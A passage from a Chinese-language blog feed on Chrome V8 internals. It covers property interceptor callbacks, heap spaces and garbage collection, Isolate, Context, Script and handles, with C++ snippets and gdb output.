c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> GenericNamedPropertyGetterCallback =<br>    <span class="hljs-built_in">void</span> (*)(Local&lt;Name&gt; property, <span class="hljs-type">const</span> PropertyCallbackInfo&lt;Value&gt;&amp; info);<br></code></pre></td></tr></table></figure><p><code>setter</code>是拦截器的<code>setter</code>函数，其在函数内部把<code>value</code>的值设置到相应的地方。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> GenericNamedPropertySetterCallback =<br>    <span class="hljs-built_in">void</span> (*)(Local&lt;Name&gt; property, Local&lt;Value&gt; value,<br>             <span class="hljs-type">const</span> PropertyCallbackInfo&lt;Value&gt;&amp; info);<br></code></pre></td></tr></table></figure><p><code>query</code>用于对象内查询某属性状态，如只读、不可枚举等，其在函数内部为<code>info</code>返回一个<code>Local&lt;Number&gt;</code>的值，代表它的状态，如<code>v8::ReadOnly</code>、<code>v8::DontDelete</code>、<code>v8::None</code>等。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> GenericNamedPropertyQueryCallback =<br>    <span class="hljs-built_in">void</span> (*)(Local&lt;Name&gt; property, <span class="hljs-type">const</span> PropertyCallbackInfo&lt;Integer&gt;&amp; info);<br></code></pre></td></tr></table></figure><p><code>deleter</code>用于对象内删除属性，其在函数内部做相应的删除操作之后为<code>info</code>返回一个是否可删除的<code>Local&lt;Boolean&gt;</code>布尔值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> GenericNamedPropertyDeleterCallback =<br>    <span class="hljs-built_in">void</span> (*)(Local&lt;Name&gt; property, <span class="hljs-type">const</span> PropertyCallbackInfo&lt;Boolean&gt;&amp; info);<br></code></pre></td></tr></table></figure><p><code>enumerator</code>用于对象枚举，如定义了<code>for...in</code>、<code>console.log</code>等执行结果的行为等，其在函数内部为<code>info</code>返回一个字段数组，表示这个对象可枚举出来的字段名。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> GenericNamedPropertyEnumeratorCallback =<br>    <span class="hljs-built_in">void</span> (*)(<span class="hljs-type">const</span> PropertyCallbackInfo&lt;Array&gt;&amp; info);<br></code></pre></td></tr></table></figure><p><code>data</code>这个参数将会被传入上述的各种函数中使用，在<code>PropertyCallbackInfo</code>的对象中，有一个<code>Data()</code>函数就是用来获取这个<code>data</code>用的，如<code>info.Data()</code>。</p><p><code>flags</code>表示这个拦截器的一些标识,主要值如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Configuration flags for v8::NamedPropertyHandlerConfiguration or</span><br><span class="hljs-comment"> * v8::IndexedPropertyHandlerConfiguration.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">enum class</span> <span class="hljs-title class_">PropertyHandlerFlags</span> &#123;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * None. 无标识</span><br><span class="hljs-comment">   */</span><br>  kNone = <span class="hljs-number">0</span>,<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * See ALL_CAN_READ above.  所有属性可读</span><br><span class="hljs-comment">   */</span><br>  kAllCanRead = <span class="hljs-number">1</span>,<br><br>  <span class="hljs-comment">/** Will not call into interceptor for properties on the receiver or prototype</span><br><span class="hljs-comment">   * chain, i.e., only call into interceptor for properties that do not exist.</span><br><span class="hljs-comment">   * Currently only valid for named interceptors.</span><br><span class="hljs-comment">   */</span><br>  kNonMasking = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">1</span>,<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Will not call into interceptor for symbol lookup.  Only meaningful for</span><br><span class="hljs-comment">   * named interceptors.</span><br><span class="hljs-comment">   */</span><br>  kOnlyInterceptStrings = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">2</span>,<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * The getter, query, enumerator callbacks do not produce side effects.</span><br><span class="hljs-comment">   */</span><br>  kHasNoSideEffect = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">3</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><p>索引型拦截器（Indexed PropertyInterpector）拦截的是数字下标访问的属性，我们可以用JavaScript中普通对象和数组的不同来类比映射型拦截器和索引型拦截器的不同。就使用方法来说，索引型拦截器和映射型拦截器大同小异。它们均通过<code>SetHandler</code>函数来设置拦截器，只不过索引型拦截器传的参数是一个<code>IndexedPropertyHandlerConfiguration</code>的对象，该类的构造函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">IndexedPropertyHandlerConfiguration</span> &#123;<br> <br>    ...<br>     <br>  <span class="hljs-built_in">IndexedPropertyHandlerConfiguration</span>(<br>      <span class="hljs-comment">/** Note: getter is required */</span><br>      IndexedPropertyGetterCallback getter = <span class="hljs-literal">nullptr</span>,<br>      IndexedPropertySetterCallback setter = <span class="hljs-literal">nullptr</span>,<br>      IndexedPropertyQueryCallback query = <span class="hljs-literal">nullptr</span>,<br>      IndexedPropertyDeleterCallback deleter = <span class="hljs-literal">nullptr</span>,<br>      IndexedPropertyEnumeratorCallback enumerator = <span class="hljs-literal">nullptr</span>,<br>      Local&lt;Value&gt; data = <span class="hljs-built_in">Local</span>&lt;Value&gt;(),<br>      PropertyHandlerFlags flags = PropertyHandlerFlags::kNone)<br>      : <span class="hljs-built_in">getter</span>(getter),<br>        <span class="hljs-built_in">setter</span>(setter),<br>        <span class="hljs-built_in">query</span>(query),<br>        <span class="hljs-built_in">deleter</span>(deleter),<br>        <span class="hljs-built_in">enumerator</span>(enumerator),<br>        <span class="hljs-built_in">definer</span>(<span class="hljs-literal">nullptr</span>),<br>        <span class="hljs-built_in">descriptor</span>(<span class="hljs-literal">nullptr</span>),<br>        <span class="hljs-built_in">data</span>(data),<br>        <span class="hljs-built_in">flags</span>(flags) &#123;&#125;<br><br>...<br>    <br>&#125;;<br></code></pre></td></tr></table></figure><p>看起来和映射型拦截器的配置对象也基本一致，只不过里面的各种回调函数的类型前缀不一样。当然，写这些函数的时候也是不一样的。</p><p>在映射型拦截器的各种回调函数中，第一个参数是一个<code>Name</code>数据对象的本地句柄（<code>Local&lt;Name&gt;</code>），而索引型拦截器的各种回调函数中的第一个参数则是一个<code>uint32_t</code>型的C++底层数据类型，即无符号32位整型，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> IndexedPropertyGetterCallback =<br>    <span class="hljs-built_in">void</span> (*)(<span class="hljs-type">uint32_t</span> index, <span class="hljs-type">const</span> PropertyCallbackInfo&lt;Value&gt;&amp; info);<br></code></pre></td></tr></table></figure><h2 id="对象模板的内置字段internal-field">对象模板的内置字段（InternalField）</h2><p>在V8中，能与JavaScript代码中直接交互的数据类型都是以句柄形式出现的V8数据类型，如<code>v8::Number</code>等，以及对象<code>v8::Object</code>。在<code>v8::Object</code>中，存在的也都是一些同类的数据。</p><p>当我们有一个自身的底层数据结构需要和V8的数据类型联系起来时，就涉及到了V8对象的另一个概念——内置字段。该字段对于JavaScript代码来说是不可见的，只有到C++的层面，才能通过<code>v8::Object</code>的特定方法将其获取出来，可以简单将其理解为V8对象数据类型的私有属性。</p><h1 id="小结">小结</h1><p>句柄作用域就是管理句柄的一种类，它以栈的形式一层一层套着，存在于Isolate实例中，栈顶的作用域是当前活动作用域，每次新建对象时得到的句柄都会与当前活动作用域绑定。当活动作用域被析构时（通常是句柄作用域所处的C++作用域结束导致生命周期到期所致），与其绑定的所有句柄都会被回收，除可逃句柄作用域所设置的已逃脱句柄。</p><p>本节还介绍了V8中的两个重要模板类型————函数模板和对象模板，这两个模板很大意义上是相辅相成的。</p>]]></content>
    
    
    <categories>
      
      <category>Software Development</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Chromium</tag>
      
      <tag>v8</tag>
      
      <tag>javascript</tag>
      
      <tag>Engine Architecture</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Chrome V8基础（一）</title>
    <link href="/2021/07/27/Basics-of-Chrome-V8-1/"/>
    <url>/2021/07/27/Basics-of-Chrome-V8-1/</url>
    
    <content type="html"><![CDATA[<h1 id="基本概念">基本概念</h1><p>Google Chrome的大致架构如下，V8主要包含堆栈的内存管理</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs text">+------------------------------------------------------------------------------------------+<br>| Google Chrome                                                                            |<br>|                                                                                          |<br>| +----------------------------------------+          +------------------------------+     |<br>| | Google V8                              |          |            WebAPIs           |     |<br>| | +-------------+ +---------------+      |          |                              |     |<br>| | |    Heap     | |     Stack     |      |          |                              |     |<br>| | |             | |               |      |          |                              |     |<br>| | |             | |               |      |          |                              |     |<br>| | |             | |               |      |          |                              |     |<br>| | |             | |               |      |          |                              |     |<br>| | |             | |               |      |          |                              |     |<br>| | +-------------+ +---------------+      |          |                              |     |<br>| |                                        |          |                              |     |<br>| +----------------------------------------+          +------------------------------+     |<br>|                                                                                          |<br>|                                                                                          |<br>| +---------------------+     +---------------------------------------+                    |<br>| |     Event loop      |     |          Task/Callback queue          |                    |<br>| |                     |     |                                       |                    |<br>| +---------------------+     +---------------------------------------+                    |<br>|                             +---------------------------------------+                    |<br>|                             |          Microtask queue              |                    |<br>|                             |                                       |                    |<br>|                             +---------------------------------------+                    |<br>|                                                                                          |<br>|                                                                                          |<br>+------------------------------------------------------------------------------------------+<br></code></pre></td></tr></table></figure><h2 id="内存机制">内存机制</h2><p>在ChromeV8中，内存机制是非常重要的，V8是一个使用C++完成的库，用于执行JavaScript，如果你在自己的JavaScript代码中声明了一个变量，那么这个变量将由V8的内存机制进行管理，且只能由它的内存回收机制所回收，而不能被我们自己进行管理（不能被delete或者free等操作符操作）。</p><p>Chrome V8中的堆内存大致可分为以下部分：</p><ul><li>新生代内存区：基本的数据对象都被分配在这里，其区域小但是回收频繁。</li><li>老生代指针区：一堆指向老生代内存区具体数据内容的指针，基本上从新生代进化过来的对象会被移动到此。</li><li>老生代数据区：存放数据对象而不是指向其他对象的指针，老生代指针区的指针就往这边指。</li><li>大对象区：这里存放体积超越其他区大小的对象，每个对象由自己的内存，GC并不会移动大对象。</li><li>代码区：代码对象，也就是包含JIT之后指令的对象，会被分配在这里，也是唯一拥有执行权限的内存区。</li><li>Cell区，属性Cell区，Map区：存放Cell，属性Cell和Map，每个区域都是存放相同大小的元素，结构简单。</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">+----------------------- -----------------------------------------------------------+<br>|   Young Generation                  Old Generation          Large Object space    |<br>|  +-------------+--------------+  +-----------+-------------+ +------------------+ |<br>|  |        NEW_SPACE           |  | MAP_SPACE | OLD_SPACE   | | LO_SPACE         | |<br>|  +-------------+--------------+  +-----------+-------------+ +------------------+ |<br>|  |  from_Space   | to_Space   |                                                   |<br>|  +-------------+--------------+                                                   |<br>|  +-------------+                 +-----------+               +------------------+ |<br>|  | NEW_LO_SPACE|                 | CODE_SPACE|               | CODE_LO_SPACE    | |<br>|  +-------------+                 +-----------+               +------------------+ |<br>|                                                                                   |<br>|   Read-only                                                                       |<br>|  +--------------+                                                                 |<br>|  | RO_SPACE     |                                                                 |<br>|  +--------------+                                                                 |<br>+-----------------------------------------------------------------------------------+<br></code></pre></td></tr></table></figure><p>上图中每个堆部分的空间被GC以不同的方式处理，最重要的两部分就是新生代内存和老生代内存的垃圾回收机制。</p><h3 id="新生代内存">新生代内存</h3><p>绝大多数JavaScript对象都会被分配到新生代内存中，内存区域很小但是垃圾回收频繁。</p><p>在新生代分配内存非常容易，我们只需要保存一个指向内存区的指针并不断根据新对象的大小递增即可。当该指针到达了新生代内存区的末尾时，就会有一次清理。</p><p>新生代内存使用Scavenge算法进行回收：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">ptrs   from_space (evacuation)   to_space<br>      +----------+            +------------+<br>-----&gt;|marked: * | ----------&gt;|marked: s   |       (s=survived)<br>      +----------+            +------------+<br>      |marked:   |      -----&gt;|marked: s   |<br>      +----------+     /      +------------+<br>-----&gt;|marked: * | ----       |            |<br>      +----------+            +------------+<br>      |marked:   |            |            |<br>      +----------+            +------------+<br>      |marked:   |            |            |<br>      +----------+            +------------+<br></code></pre></td></tr></table></figure><p>该种算法中的大致思想为：将内存一分为二，每部分的空间都被成为<code>Semispace</code>。在两个<code>Semispace</code>中，总有一个处于使用状态，成为From空间；另一个处于闲置状态，称为To空间。</p><p>在分配对象时，总使用From空间进行分配；在垃圾回收时，ChromeV8检查From空间中的存活对象，然后将这些对象复制到To空间中，剩下的对象就会被释放，完成复制后From空间和To空间的角色对调，原来的From空间变成了新的To空间，而原来的To空间就变成了From空间。由此可以看出，在新生代内存中总有至少一半的内存是空闲不用的，不过新生代内存的特点就是空间小，回收频繁，所以也浪费不了多少。</p><p>当一个新生代中的对象经过多次新生代的垃圾回收而继续坚挺在内存区中时，说明它的生命周期较长，就会被移动到老生代内存，也称为对象的晋升。</p><p>晋升的标准有两条：</p><ul><li>在垃圾回收的过程中，如果该对象已经经历过一次新生代的清理，那就会晋升</li><li>在垃圾回收的过程中，如果其中To空间的使用已经超过了25%，那么这个对象也会晋升</li></ul><h3 id="老生代内存">老生代内存</h3><p>老生代内存所保存的对象大多数是生存周期很长的甚至是常驻内存的对象，而且老生代占用的内存较多，如果这里再使用Scavenge算法进行垃圾回收，那浪费的内存就太大了。</p><p>所以GC就采用Mark-Sweep和Mark-Compact的结合体进行垃圾回收，主要采用Mark-Sweep，如果老生代空间不足以分配从新生代晋升过来的对象时，才使用Mark-Compact。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text"> Page 1              FreeList                        Page 1<br>+----------+        +--------------++------------+<br>|marked: * |---\    |    Size 1    |--------|marked: s   |<br>+----------+    \   | +----------+ |   /+------------+<br>|marked:   |     ---|&gt;|__________| |  /       -|marked: s   |<br>+----------+        | |__________|&lt;|--        /+------------+<br>|marked: * |--\     | |__________| |         /|            |<br>+----------+   \    |    Size 2    |        /+------------+<br>|marked:   |    \   | +----------+ |       /|            |<br>+----------+     ---|&gt;|__________|&lt;|-------+------------+<br>|marked:   |        | |__________| ||            |<br>+----------+        | |__________| |            +------------+<br>                    +--------------+<br></code></pre></td></tr></table></figure><h4 id="mark-sweep标记清除">Mark-Sweep（标记清除）</h4><p>其分为两个阶段：</p><ul><li>标记：在标记阶段需要遍历老生代堆中的所有对象，并标记那些活着的对象，然后进入清除阶段。</li><li>清除：在清除阶段，Chrome V8只清除没有被标记的对象。</li></ul><p>由于Mark-Sweep只清除死亡对象，而死亡对象在老生代中占用的比例通常较小，因此效率还是比较高的。就像从一堆白球中拿出几个红球还是很快的，至少比从一堆白球中拿出半堆红球快得多。</p><h4 id="mark-compact标记整理">Mark-Compact（标记整理）</h4><p>在Mark-Sweep时，容易产生内存碎片的问题,所以Mark-Compact在标记清除的基础上进行了压缩步骤，在清除时让它们变得紧缩。这相当于在清除的时候，让活着的剩余对象尽可能往内存区域的前面靠，直到内存区域前排全部排满，而后部区域是空的。</p><p>Mark-Compact的过程涉及内存区域的紧缩，所以效率比Mark-Sweep要低，不过其优势是不会产生内存碎片。</p><h4 id="惰性清理">惰性清理</h4><p>ChromeV8在标记时就可以了解到哪些对象是死的，哪些对象是活的，但清理释放是需要开销的，所以ChromeV8并不急着去清理，而是延迟进行，GC可以根据需要来清理死掉的对象。</p><h2 id="隔离实例isolate">隔离实例（Isolate）</h2><p>在Chrome V8中，一个引擎实例的数据类型叫Isolate，这是ChromeV8中所有要执行的地方都要出现的数据。它就是一个V8引擎的实例，也可以理解为引擎本体。每个实例内部拥有完全独立的各种状态，包括堆管理、垃圾回收等。</p><p>通过一个实例生成的任何对象都不能在另一个实例中使用，可以创建多个Isolate实例并且并行的在多个线程中使用，但同一个实例不能在多线程中使用。实例自身并不执行JavaScript，也没有JavaScript环境里面的上下文。</p><p>可以通过下述代码创建一个实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 省略 V8 初始化过程</span><br><br><span class="hljs-comment">// 实例所必要的参数</span><br>v8::Isolate::CreateParams create_params;<br><br><span class="hljs-comment">// 省略参数设置过程</span><br><br><span class="hljs-comment">// 创建一个实例</span><br>v8::Isolate* isolate = v8::Isolate::<span class="hljs-built_in">New</span>(create_params);<br></code></pre></td></tr></table></figure><h2 id="上下文context">上下文（Context）</h2><p>上下文是用来定义JavaScript执行环境的一个对象，其数据类型是Context，在创建时要指明属于哪个实例。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">v8::Isolate* isolate = ...;<br>v8:Local&lt;v8::Context&gt; context = v8::Context::<span class="hljs-built_in">New</span>(isolate);<br></code></pre></td></tr></table></figure><p>其大致相当于一个沙箱化的执行上下文环境，内部预置了一系列的对象和函数，具体细节将在下篇文章继续探讨。</p><h2 id="脚本script">脚本（Script）</h2><p>顾名思义，脚本就是一个包含一段已经编译好的JavaScript脚本的对象，数据类型就是Script。它在编译时就与一个处于活动状态的Context进行绑定。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">v8::Local&lt;v8::Context&gt; context = ...;<br><br>v8::Local&lt;v8::String&gt; source = 一段JavaScript代码；<br><br><span class="hljs-comment">// 与上下文绑定并编译</span><br>v8::Local&lt;v8::Value&gt; result = v8::Script::<span class="hljs-built_in">Compile</span>(context, source).<span class="hljs-built_in">ToLocalChecked</span>();<br><br><span class="hljs-comment">//执行脚本</span><br>v8::Local&lt;v8::Value&gt; result = script-&gt;<span class="hljs-built_in">Run</span>(context).<span class="hljs-built_in">ToLocalChecked</span>();<br></code></pre></td></tr></table></figure><h1 id="句柄handle">句柄（Handle）</h1><p>句柄是ChromeV8中的一个重要概念，它提供了对于堆内存中JavaScript数据对象的一个引用。与对象（Object）相似，Handle也包含一个地址成员（在HandleBase中定义，称为location_），但和对象不同的是句柄充当抽象层的作用，其可以被GC重新定位。</p><p>ChromeV8在进行垃圾回收的时候，通常会将JavaScript的数据对象移来移去。和对象指针相比，一旦一个对象被移走，这个指针就成了野指针。而在移动的过程中，GC会更新引用了这个数据块的那些句柄，让其断不了联系。当一个对象不再被句柄引用时，那么它将被认定为垃圾，ChromeV8的垃圾回收机制会不时的对其进行回收。具体细节可以参阅<code>src/handles/handles.h</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HandleBase</span> &#123;  <br> ...<br> <span class="hljs-keyword">protected</span>:<br>  Address* location_; <br>&#125;<br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;                                                           <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Handle</span> <span class="hljs-keyword">final</span> : <span class="hljs-keyword">public</span> HandleBase &#123;<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">+----------+                  +--------+         +---------+<br>|  Handle  |                  | Object |         |   int   |<br>|----------|      +-----+     |--------|         |---------|<br>|*location_| ---&gt; |&amp;ptr_| --&gt; | ptr_   | -----&gt;  |     5   |<br>+----------+      +-----+     +--------+         +---------+<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">(gdb) p handle<br>$8 = &#123;&lt;v8::internal::HandleBase&gt; = &#123;location_ = 0x7ffdf81d60c0&#125;, &lt;No data fields&gt;&#125;<br></code></pre></td></tr></table></figure><p>location_包含一个指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">(gdb) p /x *(int*)0x7ffdf81d60c0<br>$9 = 0xa9d330<br></code></pre></td></tr></table></figure><p>其值和对象中的一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">(gdb) p /x obj.ptr_<br>$14 = 0xa9d330<br></code></pre></td></tr></table></figure><p>我们可以用指针去访问这个int值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apl">(gdb) p /x *value<br>$16 = 0x5<br>(gdb) p /x *obj.ptr_<br>$17 = 0x5<br>(gdb) p /x *(int*)0x7ffdf81d60c0<br>$18 = 0xa9d330<br>(gdb) p /x *(*(int*)0x7ffdf81d60c0)<br>$19 = 0x5<br></code></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;gtest/gtest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/handles/handles.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/objects-inl.h&quot;</span></span><br><br><span class="hljs-keyword">namespace</span> i = v8::internal;<br><br><span class="hljs-built_in">TEST</span>(Handle, DefaultConstructor) &#123;<br>  i::Handle&lt;<span class="hljs-type">int</span>&gt; handle&#123;&#125;;<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(handle.<span class="hljs-built_in">is_null</span>());<br>  <span class="hljs-built_in">EXPECT_EQ</span>(handle.<span class="hljs-built_in">location</span>(), <span class="hljs-literal">nullptr</span>);<br>&#125;<br><br><span class="hljs-built_in">TEST</span>(Handle, AddressConstructor) &#123;<br>  <span class="hljs-type">int</span>* value = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">5</span>&#125;;<br>  i::Address addr = <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Address&gt;(value);<br>  i::Object obj&#123;addr&#125;;<br><br>  i::Address ptr = obj.<span class="hljs-built_in">ptr</span>();<br>  i::Address* location = &amp;ptr;<br>  <span class="hljs-function">i::Handle&lt;i::Object&gt; <span class="hljs-title">handle</span><span class="hljs-params">(location)</span></span>;<br><br>  <span class="hljs-built_in">EXPECT_EQ</span>(handle.<span class="hljs-built_in">location</span>(), &amp;ptr);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(*handle.<span class="hljs-built_in">location</span>(), ptr);<br>  i::Object deref = *handle;<br>  i::Address deref_addr = deref.<span class="hljs-built_in">ptr</span>();<br>  <span class="hljs-type">int</span>* deref_value = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">int</span>*&gt;(deref_addr);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(*deref_value, *value);<br>  <span class="hljs-keyword">delete</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><p>话说回来，句柄在Chrome V8中只是一个统称，它其实还分为多种类型：</p><ul><li>本地句柄(v8::Local)</li><li>持久句柄(v8::Persistent)</li><li>永生句柄(v8::Eternal)</li><li>待实本地句柄(MaybeLocal)</li><li>其他句柄</li></ul><blockquote><p><a href="https://v8.dev/docs/embed"class="uri">https://v8.dev/docs/embed</a></p></blockquote><p><strong>句柄存在的形式是C++的一个模板类，其需要根据不同的ChromeV8数据类型进行不同的声明。</strong> 例如：</p><ul><li><code>v8::Local&lt;v8::Number&gt;</code>本地JavaScript数据类型句柄</li><li><code>v8::Persistent&lt;v8::String&gt;</code>持久JavaScript字符串类型句柄</li></ul><h2 id="local">Local</h2><p>本地句柄存在于栈内存中，并在对应的析构函数调用时被删除，其生命周期由其所在的句柄作用域（HandleScope）决定。</p><p>含有一个指向T的指针成员</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">Local</span> &#123; <br>...<br> <span class="hljs-keyword">private</span>:<br>  T* 